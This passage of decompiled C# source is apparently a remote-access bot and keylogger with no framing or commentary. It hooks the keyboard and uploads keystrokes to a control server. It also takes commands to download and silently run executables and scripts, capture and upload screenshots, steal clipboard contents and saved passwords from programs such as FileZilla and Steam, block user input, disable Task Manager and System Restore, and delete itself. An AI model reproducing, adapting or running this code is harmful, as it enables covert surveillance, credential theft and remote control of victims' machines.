					if (Operators.CompareString(master_table_entries[i].item_type, "table", false) == 0)
					{
						array = (string[])Utils.CopyArray((Array)array, (Array)new string[num + 1]);
						array[num] = master_table_entries[i].item_name;
						num++;
					}
				}
				return array;
			}
		}

		[MethodImpl(MethodImplOptions.NoOptimization)]
		public SQLiteHandler(string baseName)
		{
			SQLDataTypeSize = new byte[10] { 0, 1, 2, 3, 4, 6, 8, 8, 0, 0 };
			checked
			{
				if (File.Exists(baseName))
				{
					FileSystem.FileOpen(1, baseName, (OpenMode)32, (OpenAccess)1, (OpenShare)3, -1);
					string s = Strings.Space((int)FileSystem.LOF(1));
					FileSystem.FileGet(1, ref s, -1L, false);
					FileSystem.FileClose(new int[1] { 1 });
					db_bytes = Encoding.Default.GetBytes(s);
					if (Encoding.Default.GetString(db_bytes, 0, 15).CompareTo("SQLite format 3") != 0)
					{
						throw new Exception("Not a valid SQLite 3 Database File");
					}
					if (db_bytes[52] != 0)
					{
						throw new Exception("Auto-vacuum capable database is not supported");
					}
					if (decimal.Compare(new decimal(ConvertToInteger(44, 4)), new decimal(4L)) >= 0)
					{
						throw new Exception("No supported Schema layer file-format");
					}
					page_size = (ushort)ConvertToInteger(16, 2);
					encoding = ConvertToInteger(56, 4);
					if (decimal.Compare(new decimal(encoding), 0m) == 0)
					{
						encoding = 1uL;
					}
					ReadMasterTable(100uL);
				}
			}
		}
	}

	public class KeyboardHook
	{
		private struct KBDLLHOOKSTRUCT
		{
			public int vkCode;

			public int scancode;

			public int flags;

			public int time;

			public int dwExtraInfo;
		}

		private delegate int KeyboardProcDelegate(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam);

		public delegate void KeyDownEventHandler(Keys Key);

		public delegate void KeyUpEventHandler(Keys Key);

		private const int HC_ACTION = 0;

		private const int WH_KEYBOARD_LL = 13;

		private const int WM_KEYDOWN = 256;

		private const int WM_KEYUP = 257;

		private const int WM_SYSKEYDOWN = 260;

		private const int WM_SYSKEYUP = 261;

		private static KeyDownEventHandler KeyDownEvent;

		private static KeyUpEventHandler KeyUpEvent;

		private static int KeyHook;

		private static KeyboardProcDelegate KeyHookDelegate;

		public static event KeyDownEventHandler KeyDown
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				KeyDownEvent = (KeyDownEventHandler)Delegate.Combine(KeyDownEvent, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				KeyDownEvent = (KeyDownEventHandler)Delegate.Remove(KeyDownEvent, value);
			}
		}

		public static event KeyUpEventHandler KeyUp
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				KeyUpEvent = (KeyUpEventHandler)Delegate.Combine(KeyUpEvent, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				KeyUpEvent = (KeyUpEventHandler)Delegate.Remove(KeyUpEvent, value);
			}
		}

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int SetWindowsHookExA(int idHook, KeyboardProcDelegate lpfn, int hmod, int dwThreadId);

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int CallNextHookEx(int hHook, int nCode, int wParam, KBDLLHOOKSTRUCT lParam);

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int UnhookWindowsHookEx(int hHook);

		public KeyboardHook()
		{
			KeyHookDelegate = KeyboardProc;
			KeyHook = SetWindowsHookExA(13, KeyHookDelegate, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
		}

		private static int KeyboardProc(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam)
		{
			if (nCode == 0)
			{
				switch (wParam)
				{
				case 256:
				case 260:
					KeyDownEvent?.Invoke((Keys)lParam.vkCode);
					break;
				case 257:
				case 261:
					KeyUpEvent?.Invoke((Keys)lParam.vkCode);
					break;
				}
			}
			return CallNextHookEx(KeyHook, nCode, wParam, lParam);
		}

		protected override void Finalize()
		{
			UnhookWindowsHookEx(KeyHook);
			base.Finalize();
		}
	}

	public struct AppInfo
	{
		public string Name;

		public string UnInstallPath;

		public string SilentUnInstallPath;
	}

	private static string wicked = null;

	private static string[] slickkidd = null;

	private const uint LOCALE_SYSTEM_DEFAULT = 1024u;

	private const uint LOCALE_SENGCOUNTRY = 4098u;

	private static string ID = "W1ck3D";

	private static string country = GetCountry();

	private static string os = ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().Replace("Microsoft ", "") + DetectOSBits();

	private static string os2 = ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().Replace("Microsoft ", "");

	private static string UserPC = Environment.UserName.ToString() + "@" + Environment.MachineName.ToString();

	private static string Password;

	private static string Weburl;

	private static string UniqueID;

	private static string Mutex;

	private static string Filename;

	private static string StartupName;

	private static string ConnectionInt = Conversions.ToString(8000);

	private static string Location = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Temp\\";

	private static string cpuInfo = string.Empty;

	private static ManagementClass mc = new ManagementClass("win32_processor");

	private static ManagementObjectCollection moc = mc.GetInstances();

	private const int SWP_HIDEWINDOW = 128;

	private const int SWP_SHOWWINDOW = 64;

	private static int taskBar;

	private static string Keylogs = null;

	private const string Chars = "abcdefghijklmnopqrstuvwxyz1234567890";

	public static string cPass;

	[AccessedThroughProperty("KH")]
	private static KeyboardHook _KH;

	private static string strin;

	private static KeyboardHook KH
	{
		get
		{
			return _KH;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			KeyboardHook.KeyDownEventHandler value2 = KH_KeyDown;
			if (_KH != null)
			{
				KeyboardHook.KeyDown -= value2;
			}
			_KH = value;
			if (_KH != null)
			{
				KeyboardHook.KeyDown += value2;
			}
		}
	} = new KeyboardHook();


	[DllImport("Kernel32.dll")]
	private static extern int GetLocaleInfo(uint Locale, uint LCType, [Out] StringBuilder lpLCData, int cchData);

	private static string GetInfo(uint lInfo)
	{
		StringBuilder stringBuilder = new StringBuilder(256);
		int localeInfo = GetLocaleInfo(1024u, lInfo, stringBuilder, stringBuilder.Capacity);
		if (localeInfo > 0)
		{
			return stringBuilder.ToString().Substring(0, checked(localeInfo - 1));
		}
		return string.Empty;
	}

	public static string GetCountry()
	{
		return GetInfo(4098u);
	}

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern long mciSendStringA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpCommandString, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpReturnString, long uReturnLength, long hwndCallback);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern long SwapMouseButton(long bSwap);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern void SendMessage(int hWnd, uint msg, uint wParam, int lparam);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SetWindowPos(int hwnd, int hWndInsertAfter, int x, int y, int cx, int cy, int wFlags);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int FindWindowA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpWindowName);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int FindWindowExA(int hWnd1, int hWnd2, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpsz1, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpsz2);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int ShowWindow(int hWnd, int nCmdShow);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int BlockInput(int fBlock);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetModuleFileNameA(int hModule, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileName, int nSize);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int ExitProcess(uint uExitCode);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int MoveFileExW([In][MarshalAs(UnmanagedType.LPTStr)] string lpExistingFileName, [In][MarshalAs(UnmanagedType.LPTStr)] string lpNewFileName, long dwFlags);

	public static void MeltFile()
	{
		string executablePath = Application.get_ExecutablePath();
		string lpFileName = Application.get_ExecutablePath();
		MoveFileExW(Strings.Left(executablePath, GetModuleFileNameA(0, ref lpFileName, 256)), Path.GetTempPath() + "\\tmpG" + DateTime.Now.Millisecond + ".tmp", 8L);
		ExitProcess(0u);
	}

	public static string DetectOSBits()
	{
		string result = null;
		if (IntPtr.Size == 8)
		{
			result = "(x64)";
		}
		else if (IntPtr.Size == 4)
		{
			result = "(x32)";
		}
		return result;
	}

	public static string DetectOSBits2()
	{
		string result = null;
		if (IntPtr.Size == 8)
		{
			result = "64 Bit";
		}
		else if (IntPtr.Size == 4)
		{
			result = "32 Bit";
		}
		return result;
	}

	public static string HWID()
	{
		//IL_0013: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
		try
		{
			enumerator = moc.GetEnumerator();
			while (enumerator.MoveNext())
			{
				ManagementObject val = (ManagementObject)enumerator.get_Current();
				if (Operators.CompareString(cpuInfo, "", false) == 0)
				{
					cpuInfo = ((ManagementBaseObject)val).get_Properties().get_Item("processorID").get_Value()
						.ToString();
					break;
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		return MD5(MD5(cpuInfo + Environment.UserName.ToString()) + Environment.MachineName.ToString());
	}

	[STAThread]
	public static void Main()
	{
		try
		{
			Thread.Sleep(3000);
			wicked = new ASCIIEncoding().GetString(Convert.FromBase64String("VDBSQ0t6QWtTYXplMGtSdHJCbWhrNW5vOVFQSUdicDFDYXdXSk83UUtGSEVYY2hHT1JSYkJMR3pjZFFCWjIweHc4ZE93Y2h5V1QxbHowMU9abDM0dlZiOUR2RmRmc043UkdrSXlUZk9qVTE1Nng0d1JHT1FCelhKeXVna052azBIdzRjck1QQWNDWVVOSkVrOGJxTFNHM1lwT21aNmR4MnE2Y3RjQ096bVBySU8weTVMVlkzNTZheUJpUmlmRENBWFFLZVFSaGFDN1FEb1VRN1Q4MEMwUW5RdEJ2dXQ0dk9rV2ZiUXFnU2xkN09JRFdOT3dnanIzSWQ3R05ZbU5hOUpQY0NEOGNPbUlLc2xTYXhnQzd4ejBsZkNBMDRMUkxyWVNvRW5zMXQ4aHVuUTNlR2N5RmU2QjMyQUczUUhwZEF1YzdpNjhSRm5rRHZIZmJ3ekIzaDJ2N2hES0szYVBWV0NKTm5IcGxFbjl2YWdmMmxBcGdtZWFwelljVUdsYUtpS2tnY1Z2allyUGlSanFMZThJOGtQWWZQVjBLcWtvQXpZS1c4QTgzSDZjdE5WOHBERjROOE45SG9iNFJLVDhlMzZXQXVMSU5uSzZNb2VPWWtVekFrSkFndlI3dlhzU0NlY2pOcTdSYzVLY1FnQUI1WnlzWUVkaXFqMUIyb0NNU0lheHVKWm5oS3Q2TE1VWWtVTDcwaDFqeW5NdTNmdDFET3dZYThidUtpamg1YzJsM0szMW5uWllaUGFJTmxTNEV4S1B5QVZHcE82aXZ4NGpzU3BRQ2NxRnJuUmdMMlZjbGoyamhwY09VUnVLd0Q3NlVIZ2pXSzhWdEhOUFRoVnBXUEo2VlJzOVVuRVVON3ZDNllGT2d6amR2TG5OSzNiM1VvRG9GRE9mVE9DMkJHVURucFFWWkJBZjZqQ210ckRqWWtZY0lzZURuME1kdldlOVhQNnMwaUdVckc0YndLMTFNR0hWY0Fkd2JmUExuUGwzZ1B3VjQ0VUNaemFkaUNGbEJlOHJkWGNFSUdEcVpwSVptYlJ2bmFTQU4zcW9iVkl0ODg4NDk3NTE5NDg5NDcxNTkwODQ5KjQ4NDA4NDc4OTc4NyoqKjU0MCotOCo4MCo0MCotNDUqNCotOCotMDU5NTQwMTUxNDgtNTE4OTQ4NDg0ODkxODk0LTE1NDE5NDQ4OCoxNTQqLSo0MTg1NDcqLTQ4OTQqLTQ4NDg5MDg0MDg0MS0xMDEwODQwKi8qKioqLTA0NC8vKi8tKi8tKjQwNSotODEw"));
			byte[] bytes = ReadResource(Application.get_ExecutablePath());
			string @string = Encoding.Default.GetString(bytes);
			@string = new ASCIIEncoding().GetString(Convert.FromBase64String(@string));
			slickkidd = Strings.Split(@string, wicked, -1, (CompareMethod)0);
			Weburl = Strings.StrReverse(slickkidd[0]);
			StartupName = Strings.StrReverse(slickkidd[1]);
			Password = Strings.StrReverse(slickkidd[2]);
			Mutex = Strings.StrReverse(slickkidd[3]);
			ID = Strings.StrReverse(slickkidd[4]);
			Filename = Strings.StrReverse(slickkidd[5]);
			ConnectionInt = Strings.StrReverse(slickkidd[6]);
			Mutex mutex = new Mutex(initiallyOwned: false, Mutex);
			if (!mutex.WaitOne(0, exitContext: false))
			{
				MeltFile();
			}
			UniqueID = HWID();
			Installme();
			RegisterMe();
			Thread thread = new Thread(Commands);
			thread.SetApartmentState(ApartmentState.STA);
			thread.Start();
			Thread thread2 = new Thread(Me_Timer_Passed);
			thread2.SetApartmentState(ApartmentState.STA);
			thread2.Start();
			Application.Run();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void Me_Timer_Passed()
	{
		while (true)
		{
			Thread.Sleep(30000);
			if (Operators.CompareString(Keylogs, (string)null, false) != 0)
			{
				SinCommand("logger=" + Keylogs + "&aka=" + UniqueID, "_bots/_logs/create.php");
				Keylogs = null;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void Commands()
	{
		//IL_0834: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ab1: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ab6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0abb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ac0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ae9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0aeb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0aed: Unknown result type (might be due to invalid IL or missing references)
		//IL_0af3: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b15: Expected I4, but got Unknown
		//IL_0baf: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bb6: Expected O, but got Unknown
		string[] array = null;
		checked
		{
			IEnumerator enumerator = default(IEnumerator);
			IEnumerator enumerator2 = default(IEnumerator);
			IEnumerator enumerator3 = default(IEnumerator);
			while (true)
			{
				try
				{
					Thread.Sleep(Conversions.ToInteger(ConnectionInt));
					array = Strings.Split(ReadMain(), "#", -1, (CompareMethod)0);
					string text = array[0];
					if (Operators.CompareString(text, Conversions.ToString(1), false) == 0)
					{
						string text2 = array[1].Substring(array[1].LastIndexOf("/") + 1).ToString();
						string text3 = Path.GetTempPath() + text2.Replace("?-*", null);
						if (File.Exists(text3))
						{
							FileSystem.Kill(text3);
						}
						if (text2.Contains("?-*"))
						{
							text2.Replace("?-*", null);
							((ServerComputer)MyProject.Computer).get_Network().DownloadFile(array[1].Replace("?-*", null), text3);
							Process process = new Process();
							process.StartInfo.FileName = text3;
							process.StartInfo.CreateNoWindow = true;
							process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
							process.Start();
						}
						else
						{
							((ServerComputer)MyProject.Computer).get_Network().DownloadFile(array[1], text3);
							Process.Start(text3);
						}
						UpdateStatus("Downloaded & Executed");
					}
					else if (Operators.CompareString(text, Conversions.ToString(2), false) == 0)
					{
						Application.Restart();
						UpdateStatus("Restarted Bot");
						ProjectData.EndApp();
					}
					else if (Operators.CompareString(text, Conversions.ToString(3), false) == 0)
					{
						UpdateStatus("Exited Bot");
						ProjectData.EndApp();
					}
					else if (Operators.CompareString(text, Conversions.ToString(4), false) == 0)
					{
						Process.Start(array[1]);
						UpdateStatus("Visited Website");
					}
					else if (Operators.CompareString(text, Conversions.ToString(5), false) == 0)
					{
						UpdateStatus("Logged off");
						object objectValue = RuntimeHelpers.GetObjectValue(Interaction.GetObject("Winmgmts:{impersonationLevel=impersonate,(Debug,Shutdown)}", (string)null));
						try
						{
							enumerator = ((IEnumerable)NewLateBinding.LateGet(objectValue, (Type)null, "InstancesOf", new object[1] { "Win32_OperatingSystem" }, (string[])null, (Type[])null, (bool[])null)).GetEnumerator();
							while (enumerator.MoveNext())
							{
								object objectValue2 = RuntimeHelpers.GetObjectValue(enumerator.Current);
								Conversions.ToSingle(NewLateBinding.LateGet(objectValue2, (Type)null, "Win32Shutdown", new object[2] { 0, 0 }, (string[])null, (Type[])null, (bool[])null));
							}
						}
						finally
						{
							if (enumerator is IDisposable)
							{
								(enumerator as IDisposable).Dispose();
							}
						}
					}
					else if (Operators.CompareString(text, Conversions.ToString(6), false) == 0)
					{
						UpdateStatus("Shuteddown PC");
						object objectValue3 = RuntimeHelpers.GetObjectValue(Interaction.GetObject("Winmgmts:{impersonationLevel=impersonate,(Debug,Shutdown)}", (string)null));
						try
						{
							enumerator2 = ((IEnumerable)NewLateBinding.LateGet(objectValue3, (Type)null, "InstancesOf", new object[1] { "Win32_OperatingSystem" }, (string[])null, (Type[])null, (bool[])null)).GetEnumerator();
							while (enumerator2.MoveNext())
							{
								object objectValue4 = RuntimeHelpers.GetObjectValue(enumerator2.Current);
								Conversions.ToSingle(NewLateBinding.LateGet(objectValue4, (Type)null, "Win32Shutdown", new object[2] { 12, 0 }, (string[])null, (Type[])null, (bool[])null));
							}
						}
						finally
						{
							if (enumerator2 is IDisposable)
							{
								(enumerator2 as IDisposable).Dispose();
							}
						}
					}
					else if (Operators.CompareString(text, Conversions.ToString(7), false) == 0)
					{
						UpdateStatus("Restarted PC");
						object objectValue5 = RuntimeHelpers.GetObjectValue(Interaction.GetObject("Winmgmts:{impersonationLevel=impersonate,(Debug,Shutdown)}", (string)null));
						try
						{
							enumerator3 = ((IEnumerable)NewLateBinding.LateGet(objectValue5, (Type)null, "InstancesOf", new object[1] { "Win32_OperatingSystem" }, (string[])null, (Type[])null, (bool[])null)).GetEnumerator();
							while (enumerator3.MoveNext())
							{
								object objectValue6 = RuntimeHelpers.GetObjectValue(enumerator3.Current);
								Conversions.ToSingle(NewLateBinding.LateGet(objectValue6, (Type)null, "Win32Shutdown", new object[2] { 6, 0 }, (string[])null, (Type[])null, (bool[])null));
							}
						}
						finally
						{
							if (enumerator3 is IDisposable)
							{
								(enumerator3 as IDisposable).Dispose();
							}
						}
					}
					else if (Operators.CompareString(text, Conversions.ToString(8), false) == 0)
					{
						UpdateStatus("PC Hibernated");
						Application.SetSuspendState((PowerState)1, true, true);
					}
					else if (Operators.CompareString(text, Conversions.ToString(9), false) == 0)
					{
						string lpCommandString = "set CDAudio door open";
						string lpReturnString = "";
						mciSendStringA(ref lpCommandString, ref lpReturnString, 0L, 0L);
						UpdateStatus("Opened CD Drive");
					}
					else if (Operators.CompareString(text, Conversions.ToString(10), false) == 0)
					{
						string lpReturnString = "set CDAudio door closed";
						string lpCommandString = "";
						mciSendStringA(ref lpReturnString, ref lpCommandString, 0L, 0L);
						UpdateStatus("Closed CD Drive");
					}
					else if (Operators.CompareString(text, Conversions.ToString(11), false) == 0)
					{
						object objectValue7 = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("SAPI.Spvoice", ""));
						object[] array2 = new object[1];
						object[] array3 = array2;
						string[] array4 = array;
						string[] array5 = array4;
						int num = 1;
						array3[0] = array5[1];
						object[] array6 = array2;
						object[] array7 = array6;
						bool[] array8 = new bool[1] { true };
						NewLateBinding.LateCall(objectValue7, (Type)null, "speak", array7, (string[])null, (Type[])null, array8, true);
						if (array8[0])
						{
							array4[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array6[0]), typeof(string));
						}
						UpdateStatus("PC has spoken");
					}
					else if (Operators.CompareString(text, Conversions.ToString(12), false) == 0)
					{
						SwapMouseButton(256L);
						UpdateStatus("Swapped Mouse");
					}
					else if (Operators.CompareString(text, Conversions.ToString(13), false) == 0)
					{
						SwapMouseButton(0L);
						UpdateStatus("Fixed Mouse");
					}
					else if (Operators.CompareString(text, Conversions.ToString(14), false) == 0)
					{
						SendMessage(-1, 274u, 61808u, 2);
						UpdateStatus("Monitor Off");
					}
					else if (Operators.CompareString(text, Conversions.ToString(15), false) == 0)
					{
						SendMessage(-1, 274u, 61808u, -1);
						UpdateStatus("Monitor On");
					}
					else if (Operators.CompareString(text, Conversions.ToString(16), false) == 0)
					{
						string lpReturnString = "Progman";
						string lpCommandString = null;
						int hWnd = FindWindowExA(0, 0, ref lpReturnString, ref lpCommandString);
						ShowWindow(hWnd, 0);
						UpdateStatus("DesktopIcons Hidden");
					}
					else if (Operators.CompareString(text, Conversions.ToString(17), false) == 0)
					{
						string lpReturnString = "Progman";
						string lpCommandString = null;
						int hWnd2 = FindWindowExA(0, 0, ref lpReturnString, ref lpCommandString);
						ShowWindow(hWnd2, 5);
						UpdateStatus("DesktopIcons Visible");
					}
					else if (Operators.CompareString(text, Conversions.ToString(18), false) == 0)
					{
						BlockInput(1);
						UpdateStatus("Blocked Input");
					}
					else if (Operators.CompareString(text, Conversions.ToString(19), false) == 0)
					{
						BlockInput(0);
						UpdateStatus("Unblocked Input");
					}
					else if (Operators.CompareString(text, Conversions.ToString(20), false) == 0)
					{
						string lpReturnString = "Shell_traywnd";
						string lpCommandString = "";
						taskBar = FindWindowA(ref lpReturnString, ref lpCommandString);
						UpdateStatus("Taskbar Hidden");
					}
					else if (Operators.CompareString(text, Conversions.ToString(21), false) == 0)
					{
						string lpReturnString = "Shell_traywnd";
						string lpCommandString = "";
						taskBar = FindWindowA(ref lpReturnString, ref lpCommandString);
						UpdateStatus("Taskbar Visable");
					}
					else if (Operators.CompareString(text, Conversions.ToString(22), false) == 0)
					{
						Winserial();
						UpdateStatus("Sent Serialkey");
					}
					else if (Operators.CompareString(text, Conversions.ToString(23), false) == 0)
					{
						string text4 = null;
						text4 = Random1();
						array[1] = new ASCIIEncoding().GetString(Convert.FromBase64String(array[1]));
						File.WriteAllText(Path.GetTempPath() + text4 + ".html", array[1].Replace("<NEWLINE>", "\r\n"));
						Process.Start(Path.GetTempPath() + text4 + ".html", Conversions.ToString(1));
						text4 = null;
						UpdateStatus("Html Scripted");
					}
					else if (Operators.CompareString(text, Conversions.ToString(24), false) == 0)
					{
						string text5 = null;
						text5 = Random1();
						array[1] = new ASCIIEncoding().GetString(Convert.FromBase64String(array[1]));
						Interaction.MsgBox((object)array[1], (MsgBoxStyle)0, (object)null);
						File.WriteAllText(Path.GetTempPath() + text5 + ".bat", array[1].Replace("<NEWLINE>", "\r\n"));
						Process.Start(Path.GetTempPath() + text5 + ".bat", Conversions.ToString(1));
						text5 = null;
						UpdateStatus("Batch Scripted");
					}
					else if (Operators.CompareString(text, Conversions.ToString(25), false) == 0)
					{
						string text6 = null;
						text6 = Random1();
						array[1] = new ASCIIEncoding().GetString(Convert.FromBase64String(array[1]));
						File.WriteAllText(Path.GetTempPath() + text6 + ".vbs", array[1].Replace("<NEWLINE>", "\r\n"));
						Process.Start(Path.GetTempPath() + text6 + ".vbs", Conversions.ToString(1));
						text6 = null;
						UpdateStatus("VisualBasics Scripted");
					}
					else if (Operators.CompareString(text, Conversions.ToString(26), false) == 0)
					{
						((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", (object)"1", RegistryValueKind.DWord);
						UpdateStatus("Disabled Registry");
					}
					else if (Operators.CompareString(text, Conversions.ToString(27), false) == 0)
					{
						((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", (object)"0", RegistryValueKind.DWord);
						UpdateStatus("Enabled Registry");
					}
					else if (Operators.CompareString(text, Conversions.ToString(28), false) == 0)
					{
						((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", (object)"1", RegistryValueKind.DWord);
						UpdateStatus("Disabled Taskmanager");
					}
					else if (Operators.CompareString(text, Conversions.ToString(29), false) == 0)
					{
						((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", (object)"0", RegistryValueKind.DWord);
						UpdateStatus("Enabled Taskmanager");
					}
					else if (Operators.CompareString(text, Conversions.ToString(30), false) == 0)
					{
						((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore", "DisableSR", (object)"1", RegistryValueKind.DWord);
						UpdateStatus("Disabled Systemrestore");
					}
					else if (Operators.CompareString(text, Conversions.ToString(31), false) == 0)
					{
						((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore", "DisableSR", (object)"0", RegistryValueKind.DWord);
						UpdateStatus("Enabled Systemrestore");
					}
					else if (Operators.CompareString(text, Conversions.ToString(32), false) == 0)
					{
						MessageBoxButtons val = msgbuttons(array[4]);
						MessageBoxIcon val2 = msgicons(array[3]);
						string update = null;
						switch (unchecked(MessageBox.Show(array[2].Replace("<NEWLINE>", "\r\n"), array[1].Replace("<NEWLINE>", "\r\n"), val, val2) - 1))
						{
						case 0:
							update = "Answer : Ok";
							break;
						case 1:
							update = "Answer : Cancel";
							break;
						case 2:
							update = "Answer : Abort";
							break;
						case 3:
							update = "Answer : Retry";
							break;
						case 4:
							update = "Answer : Ignore";
							break;
						case 5:
							update = "Answer : Yes";
							break;
						case 6:
							update = "Answer : No";
							break;
						}
						UpdateStatus(update);
					}
					else if (Operators.CompareString(text, Conversions.ToString(33), false) == 0)
					{
						Point point = new Point(0, 0);
						int width = Screen.GetBounds(point).Width;
						point = new Point(0, 0);
						int height = Screen.GetBounds(point).Height;
						Bitmap val3 = new Bitmap(width, height);
						Graphics val4 = Graphics.FromImage((Image)(object)val3);
						Size size = new Size(width, height);
						val4.CopyFromScreen(0, 0, 0, 0, size);
						((Image)val3).Save(Path.GetTempPath() + UniqueID + ".jpg", ImageFormat.get_Jpeg());
						ServicePointManager.Expect100Continue = false;
						WebClient webClient = new WebClient();
						webClient.UploadFile(Weburl + "_bots/_imgs/create.php?fine=" + UniqueID, "POST", Path.GetTempPath() + UniqueID + ".jpg");
						File.Delete(Path.GetTempPath() + UniqueID + ".jpg");
						UpdateStatus("Image Uploaded");
					}
					else if (Operators.CompareString(text, Conversions.ToString(34), false) == 0)
					{
						SinCommand("logger=" + Keylogs + "#&aka=" + UniqueID, "_bots/_logs/create.php");
						Keylogs = null;
						UpdateStatus("Keylogs Sent");
					}
					else if (Operators.CompareString(text, Conversions.ToString(35), false) == 0)
					{
						SinCommand("uniqueid=" + UniqueID + "&password=" + Password, "system/_kill.php");
						Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.DeleteValue(StartupName, throwOnMissingValue: false);
						UpdateStatus("Uninstalled");
						MeltFile();
					}
					else if (Operators.CompareString(text, Conversions.ToString(36), false) == 0)
					{
						Process.Start(array[1]);
						UpdateStatus("Website Visited");
					}
					else if (Operators.CompareString(text, Conversions.ToString(37), false) == 0)
					{
						SinCommand("proc=" + delegateproces().Replace("\\", ">") + "&unid=" + UniqueID, "system/_prcs.php");
						UpdateStatus("Processlist Received");
					}
					else if (Operators.CompareString(text, Conversions.ToString(38), false) == 0)
					{
						KickHisAss(array[1]);
						UpdateStatus("ProcessKilled");
					}
					else if (Operators.CompareString(text, Conversions.ToString(39), false) == 0)
					{
						string text7 = null;
						text7 = AccountType() + "#" + DetectOSBits2() + "#" + ID + "#" + GetCountry() + "#" + Application.get_StartupPath() + "#" + Environment.UserName + "#" + defaultbrowser() + "#" + os2 + "#" + Environment.MachineName + "#" + Path.GetPathRoot(Environment.SystemDirectory) + "#" + Strings.Mid(Conversions.ToString((double)Environment.TickCount / 3600000.0), 1, 5) + " Hours";
						SinCommand("info=" + text7.Replace("\\", "^") + "&unid=" + UniqueID, "system/_pinfo.php");
						UpdateStatus("PC Specifications Received");
					}
					else if (Operators.CompareString(text, Conversions.ToString(40), false) == 0)
					{
						((Computer)MyProject.Computer).get_Clipboard().Clear();
						UpdateStatus("Clip Cleared");
					}
					else if (Operators.CompareString(text, Conversions.ToString(41), false) == 0)
					{
						((Computer)MyProject.Computer).get_Clipboard().SetText(array[1]);
						UpdateStatus("Clip Changed");
					}
					else if (Operators.CompareString(text, Conversions.ToString(42), false) == 0)
					{
						SinCommand("clip=" + ((Computer)MyProject.Computer).get_Clipboard().GetText() + "&unid=" + UniqueID, "system/_clip.php");
						UpdateStatus("Clip Received");
					}
					else if (Operators.CompareString(text, Conversions.ToString(43), false) == 0)
					{
						FileZilla();
						Imvu();
						WindowsLiveMessenger();
						DynDns();
						Pidgin();
						GetSteamUsername();
						UpdateStatus("Sent P. Passwords");
					}
					else if (Operators.CompareString(text, Conversions.ToString(44), false) == 0)
					{
						string text8 = array[1].Substring(array[1].LastIndexOf("/") + 1).ToString();
